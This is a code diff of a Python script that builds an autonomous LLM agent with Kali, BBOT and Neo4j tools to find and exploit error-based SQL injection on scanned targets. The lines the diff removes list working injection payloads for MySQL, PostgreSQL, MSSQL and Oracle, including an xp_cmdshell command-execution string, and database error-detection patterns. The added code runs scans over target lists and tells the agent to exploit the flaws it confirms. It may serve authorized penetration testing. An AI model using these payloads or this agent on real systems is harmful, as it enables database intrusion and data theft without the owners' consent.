@@ -1,6 +1,7 @@
 import argparse
 import asyncio
 import json
+import time
 import typing as t
 from pathlib import Path
 
@@ -17,212 +18,86 @@ dn.configure(server=None, token=None, project="error-based-sqli-agent", console=
 
 console = Console()
 
-# Error-based SQLi focused payloads
-ERROR_BASED_PAYLOADS = [
-    # Basic error triggers
-    "'", "\"", "'))", "')", "\")", 
-    
-    # MySQL error-based
-    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,VERSION(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--",
-    "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND()*2))x FROM(SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",
-    
-    # PostgreSQL error-based
-    "' AND CAST(VERSION() AS INT)--",
-    "' AND 1::text LIKE 1--",
-    "' AND (SELECT * FROM GENERATE_SERIES(1,1000))--",
-    
-    # MSSQL error-based
-    "' AND CONVERT(INT,@@VERSION)--",
-    "' AND CAST(@@version AS INT)--",
-    "'; EXEC xp_cmdshell('whoami')--",
-    
-    # Oracle error-based
-    "' AND UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) IS NOT NULL--",
-    "' AND EXTRACTVALUE(XMLType('<?xml version=\"1.0\" encoding=\"UTF-8\"?><root>'||(SELECT banner FROM v$version WHERE rownum=1)||'</root>'),'/root') IS NOT NULL--",
-    
-    # XML/XPATH errors
-    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
-    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
-]
-
-# Database error patterns for detection
-ERROR_PATTERNS = {
-    'mysql': [
-        'mysql_fetch_array()',
-        'mysql_num_rows()',
-        'you have an error in your sql syntax',
-        'warning: mysql',
-        'function.mysql',
-        'mysql result index',
-        'mysql error',
-        'mysql_query()',
-        'num_rows',
-        'mysql_error',
-        'supplied argument is not a valid mysql',
-        'column count doesn\'t match value count at row',
-        'mysql server version for the right syntax to use',
-        'operand should contain 1 column()',
-    ],
-    'postgresql': [
-        'postgresql query failed',
-        'warning: pg_',
-        'valid postgresql result',
-        'npgsql',
-        'pg_query()',
-        'pg_exec()',
-        'function.pg',
-        'postgresql result index',
-        'pg_result',
-        'pg_exec() expects',
-        'query failed: error: column',
-        'pg_num_rows()',
-        'query failed: error: relation',
-        'pgsql',
-        'supplied argument is not a valid pgsql',
-        'unterminated quoted string at or near',
-    ],
-    'mssql': [
-        'driver.*sql server',
-        'ole db.*sql server',
-        'microsoft sql server',
-        'sqlserver',
-        'mssql',
-        'sql server',
-        'microsoft.jet.oledb',
-        'microsoft ole db provider',
-        'unclosed quotation mark after the character string',
-        'incorrect syntax near',
-        'system.data.oledb.oledbexception',
-        'system.data.sqlclient.sqlexception',
-        'microsoft.jet',
-        'odbc.*sql server',
-        'sqloledb',
-        'convert.*varchar.*int',
-    ],
-    'oracle': [
-        'oci_parse',
-        'oci_execute',
-        'oracle.exe',
-        'oracle driver',
-        'warning: oci_',
-        'warning: ora_',
-        'ora-[0-9]+',
-        'oracle error',
-        'oracle.*driver',
-        'function.oci',
-        'quoted string not properly terminated',
-        'sql command not properly ended',
-        'missing expression',
-        'invalid number',
-        'ora-00933',
-        'ora-00921',
-        'ora-00936',
-    ]
-}
-
-@dn.task(name="Error-Based SQLi Analysis", label="analyze_error_sqli")
-async def analyze_error_based_sqli(finding_data: dict[str, t.Any]) -> dict[str, t.Any]:
-    """Analyze a finding specifically for error-based SQL injection."""
-    agent = create_error_based_sqli_agent()
+@dn.task(name="Analyze Error-Based SQLi Finding", label="analyze_error_sqli_finding")
+async def analyze_sqli_finding(finding_data: dict[str, t.Any]) -> dict[str, t.Any]:
+    """Analyze a BBOT SQL injection finding for error-based exploitability."""
+    sqli_agent = create_sqli_agent()
     
     url = finding_data.get('data', {}).get('url', '')
     host = finding_data.get('data', {}).get('host', '')
     description = finding_data.get('data', {}).get('description', '')
     
     param_name = extract_param_name(description)
+    param_type = extract_param_type(description)
     original_value = extract_original_value(description)
     
-    console.print(f"[*] Testing ERROR-BASED SQL injection on {host}")
-    console.print(f"    URL: {url}")
-    console.print(f"    Parameter: {param_name}")
+    result = await sqli_agent.run(
+        f"Analyze the potential SQL injection vulnerability at {url} using parameter '{param_name}'. "
+        f"The original parameter value was: {original_value}\n\n"
+        f"Focus on ERROR-BASED SQL injection techniques. Test for database errors that leak information. "
+        f"Start simple and adapt based on error messages you receive."
+    )
+
+    tool_outputs = {}
+    tools_used = []
     
-    # Build focused prompt with error-based context
-    prompt = f"""Target: {url}
-Parameter: {param_name}
-Original Value: {original_value}
+    for message in result.messages:
+        if message.role == "assistant" and message.tool_calls:
+            for tool_call in message.tool_calls:
+                tool_name = tool_call.function.name
+                tools_used.append(tool_name)
+        elif message.role == "tool":
+            tool_name = getattr(message, "name", "unknown")
+            tool_outputs[tool_name] = message.content
 
-MISSION: Test this parameter specifically for ERROR-BASED SQL injection vulnerabilities.
+    finding_stored = "store_sqli_finding" in tools_used
+    has_sqli = finding_stored
+    if result.messages and result.messages[-1].content:
+        has_sqli = has_sqli or any(
+            phrase in result.messages[-1].content.lower()
+            for phrase in [
+                "error-based injection confirmed",
+                "database error detected",
+                "mysql error",
+                "postgresql error", 
+                "oracle error",
+                "mssql error",
+                "sql syntax error",
+                "database version extracted",
+                "error message leaked",
+            ]
+        )
 
-METHODOLOGY:
-1. Start with basic error triggers: single quotes, double quotes
-2. Progress to database-specific error-based payloads 
-3. Analyze error messages for database type identification
-4. Attempt data extraction via error messages
-5. Log findings with specific error patterns detected
-
-Focus ONLY on error-based techniques. Look for verbose error messages that leak information about the database structure, version, or data.
-
-Use your HTTP tools to test the payloads systematically and analyze response differences."""
-
-    result = await agent.run(prompt)
+    dn.log_metric("tools_used", len(tools_used))
+    dn.log_metric("has_error_sqli", 1 if has_sqli else 0)
+    dn.log_metric("stored_in_db", 1 if finding_stored else 0)
     
-    # Process results with error-based specific logic
-    has_error_sqli = analyze_error_responses(result)
-    db_type = detect_database_type(result)
-    
-    dn.log_metric("error_based_sqli_found", 1 if has_error_sqli else 0)
-    dn.log_metric("database_type_detected", 1 if db_type else 0)
-    
-    return {
+    analysis_result = {
         "url": url,
         "host": host,
         "parameter": param_name,
-        "vulnerability_type": "error_based_sqli",
-        "has_sqli": has_error_sqli,
-        "database_type": db_type,
+        "param_type": param_type,
+        "tools_used": tools_used,
+        "tool_outputs": tool_outputs,
         "analysis": result.messages[-1].content if result.messages else None,
-        "detection_method": "error_message_analysis"
+        "steps": result.steps,
+        "has_sqli": has_sqli,
+        "stored_in_db": finding_stored,
+        "original_finding": finding_data
     }
 
-def analyze_error_responses(result: AgentResult) -> bool:
-    """Analyze agent responses for error-based SQLi indicators."""
-    if not result.messages:
-        return False
-    
-    content = ' '.join([msg.content for msg in result.messages if msg.content]).lower()
-    
-    # Check for error-based SQLi success indicators
-    success_indicators = [
-        'database error detected',
-        'sql syntax error',
-        'mysql error message',
-        'postgresql error',
-        'oracle error',
-        'mssql error',
-        'version information leaked',
-        'database version',
-        'table information exposed',
-        'column count error',
-        'syntax error in sql',
-        'error message contains',
-        'verbose error'
-    ]
-    
-    return any(indicator in content for indicator in success_indicators)
+    return analysis_result
 
-def detect_database_type(result: AgentResult) -> str:
-    """Detect database type from error messages in agent output."""
-    if not result.messages:
-        return ""
-    
-    content = ' '.join([msg.content for msg in result.messages if msg.content]).lower()
-    
-    # Check patterns for each database type
-    for db_type, patterns in ERROR_PATTERNS.items():
-        if any(pattern.lower() in content for pattern in patterns):
-            return db_type
-    
-    return ""
+def create_sqli_agent() -> Agent:
+    """Create an error-based SQL injection analysis agent."""
+    tools = [BBotTool(), KaliTool(), Neo4jTool()]
 
-def create_error_based_sqli_agent() -> Agent:
-    """Create an error-based SQL injection specialist agent."""
-    tools = [KaliTool(), BBotTool(), Neo4jTool()]
-    
-    error_based_context = """
-ERROR-BASED SQL INJECTION SPECIALIST
-
-You are an expert focused EXCLUSIVELY on error-based SQL injection techniques.
+    return Agent(
+        name="error-based-sqli-agent",
+        description="An agent that analyzes and exploits error-based SQL injection vulnerabilities",
+        model="gpt-4-turbo",
+        tools=tools,
+        instructions="""You are an expert at analyzing and exploiting error-based SQL injection vulnerabilities.
 
 Your mission is to trigger verbose database errors that leak information. Start simple and adapt based on what you discover:
 
@@ -232,23 +107,23 @@ Your mission is to trigger verbose database errors that leak information. Start 
 4. Extract information progressively through error message analysis
 5. Document findings and iterate your approach based on responses
 
-Key principle: Let the application's responses guide your next steps. Each error message tells you something about the backend.
+Use the http_request tool to test payloads systematically. Let the application's responses guide your next steps.
 
-Use the http_request tool to test payloads systematically. Analyze error patterns and adapt your approach.
-"""
-
-    return Agent(
-        name="error-based-sqli-agent",
-        description="Specialized agent for error-based SQL injection detection and exploitation",
-        model="gpt-4-turbo",
-        tools=tools,
-        instructions=error_based_context,
+If you confirm error-based SQL injection exists, use store_sqli_finding to record the vulnerability.""",
     )
 
 def extract_param_name(description: str) -> str:
     """Extract parameter name from BBOT finding description."""
     if "Name: [" in description:
         start = description.find("Name: [") + 7
+        end = description.find("]", start)
+        return description[start:end] if end > start else "unknown"
+    return "unknown"
+
+def extract_param_type(description: str) -> str:
+    """Extract parameter type from BBOT finding description."""
+    if "Parameter Type: [" in description:
+        start = description.find("Parameter Type: [") + 17
         end = description.find("]", start)
         return description[start:end] if end > start else "unknown"
     return "unknown"
@@ -261,39 +136,152 @@ def extract_original_value(description: str) -> str:
         return description[start:end] if end > start else ""
     return ""
 
-async def main():
-    parser = argparse.ArgumentParser(description="Error-based SQL injection specialist")
-    parser.add_argument("finding_file", type=Path, help="JSON file containing SQLi findings")
-    parser.add_argument("--debug", action="store_true", help="Debug mode")
+def is_sqli_finding(event: dict[str, t.Any]) -> bool:
+    """Check if a BBOT event is a SQL injection finding."""
+    if event.get('type') != 'FINDING':
+        return False
     
-    args = parser.parse_args()
+    description = event.get('data', {}).get('description', '')
+    return 'SQL Injection' in description
+
+async def hunt_from_bbot_scan(
+    targets: Path | None = None,
+    presets: list[str] | None = None,
+    modules: list[str] | None = None,
+    flags: list[str] | None = None,
+    config: Path | dict[str, t.Any] | None = None,
+) -> None:
+    """Hunt for error-based SQL injection vulnerabilities from BBOT scan findings."""
     
+    if isinstance(targets, Path):
+        with targets.open() as f:
+            targets = [line.strip() for line in f.readlines() if line.strip()]
+
+    if not targets:
+        console.print("Error: No targets provided.")
+        return
+
     with dn.run("error-based-sqli-hunt"):
-        console.print("Starting ERROR-BASED SQL injection analysis...")
+        dn.log_params(
+            target_count=len(targets),
+            presets=presets or [],
+            modules=modules or [],
+            flags=flags or [],
+        )
+
+        console.print(f"Starting error-based SQL injection hunt on {len(targets)} targets...")
+
+        sqli_findings_count = 0
+        total_findings = 0
         
+        tool = BBotTool()
+        scan_modules = modules or ["httpx", "excavate", "hunt"]
+        
+        for target in targets:
+            try:
+                scan_config = config or {"omit_event_types": []}
+                
+                events = tool.run(
+                    target=target,
+                    presets=presets,
+                    modules=scan_modules,
+                    flags=flags,
+                    config=scan_config,
+                )
+                
+                async for event in events:
+                    if is_sqli_finding(event):
+                        total_findings += 1
+                        
+                        try:
+                            analysis_result = await analyze_sqli_finding(event)
+                            
+                            if analysis_result["has_sqli"]:
+                                sqli_findings_count += 1
+                                
+                                security_finding = {
+                                    "url": analysis_result["url"],
+                                    "host": analysis_result["host"], 
+                                    "parameter": analysis_result["parameter"],
+                                    "finding_type": "error_based_sqli",
+                                    "risk_level": "high",
+                                    "analysis": analysis_result["analysis"],
+                                    "tool_outputs": analysis_result["tool_outputs"],
+                                    "timestamp": time.time(),
+                                    "stored_in_db": analysis_result["stored_in_db"],
+                                }
+                                
+                                dn.log_output(f"error_sqli_finding_{analysis_result['host']}", security_finding)
+                                console.print(f"Error-based SQL injection confirmed on {analysis_result['host']}")
+                            else:
+                                console.print(f"Error-based SQL injection not exploitable on {event.get('host')}")
+                                
+                        except Exception as e:
+                            console.print(f"Error analyzing SQL injection finding: {e}")
+
+            except Exception as e:
+                console.print(f"Error scanning {target}: {e}")
+
+        dn.log_metric("total_findings", total_findings)
+        dn.log_metric("error_based_confirmed", sqli_findings_count)
+        
+        console.print(f"Hunt Summary:")
+        console.print(f"   SQL injection candidates found: {total_findings}")
+        console.print(f"   Error-based SQL injection vulnerabilities confirmed: {sqli_findings_count}")
+
+async def analyze_finding_file(finding_file: Path, debug: bool = False) -> None:
+    """Analyze SQL injection findings from a JSON file."""
+    
+    with dn.run("error-based-sqli-analyze"):        
         try:
-            with open(args.finding_file) as f:
+            with finding_file.open() as f:
                 findings = json.load(f)
             
             if not isinstance(findings, list):
                 findings = [findings]
             
-            confirmed_count = 0
+            sqli_count = 0
             for finding in findings:
-                analysis_result = await analyze_error_based_sqli(finding)
-                
-                if analysis_result["has_sqli"]:
-                    confirmed_count += 1
-                    console.print(f"[+] ERROR-BASED SQLi CONFIRMED: {analysis_result['host']}")
-                    console.print(f"    Database: {analysis_result['database_type']}")
-                else:
-                    console.print(f"[-] No error-based SQLi: {finding.get('data', {}).get('host')}")
+                if is_sqli_finding(finding):
+                    analysis_result = await analyze_sqli_finding(finding)
+                    
+                    if debug:
+                        console.print(f"Tools used: {', '.join(analysis_result['tools_used'])}")
+                    
+                    if analysis_result["has_sqli"]:
+                        sqli_count += 1
+                        console.print(f"Error-based SQL injection confirmed")
+                    else:
+                        console.print(f"No error-based SQL injection exploitation possible")
             
-            dn.log_metric("total_error_sqli_confirmed", confirmed_count)
-            console.print(f"\nError-based SQLi Summary: {confirmed_count} confirmed")
+            dn.log_metric("error_based_findings", sqli_count)
             
         except Exception as e:
-            console.print(f"Error: {e}")
+            console.print(f"Error analyzing findings file: {e}")
+
+async def main() -> None:
+    parser = argparse.ArgumentParser(description="Error-based SQL injection vulnerability hunter")
+    subparsers = parser.add_subparsers(dest="command", help="Available commands")
+
+    hunt_parser = subparsers.add_parser("hunt", help="Hunt for error-based SQL injection vulnerabilities using BBOT")
+    hunt_parser.add_argument("--targets", type=Path, help="Path to file containing targets")
+    hunt_parser.add_argument("--presets", nargs="*", help="BBOT presets to use")
+    hunt_parser.add_argument("--modules", nargs="*", help="BBOT modules to use")
+    hunt_parser.add_argument("--flags", nargs="*", help="BBOT flags to use")
+    hunt_parser.add_argument("--config", type=Path, help="Path to config file")
+
+    analyze_parser = subparsers.add_parser("analyze", help="Analyze SQL injection findings from JSON file")
+    analyze_parser.add_argument("finding_file", type=Path, help="JSON file containing BBOT findings")
+    analyze_parser.add_argument("--debug", action="store_true", help="Show debug information")
+
+    args = parser.parse_args()
+
+    if args.command == "hunt":
+        await hunt_from_bbot_scan(args.targets, args.presets, args.modules, args.flags, args.config)
+    elif args.command == "analyze":
+        await analyze_finding_file(args.finding_file, args.debug)
+    else:
+        parser.print_help()
 
 if __name__ == "__main__":
     asyncio.run(main())
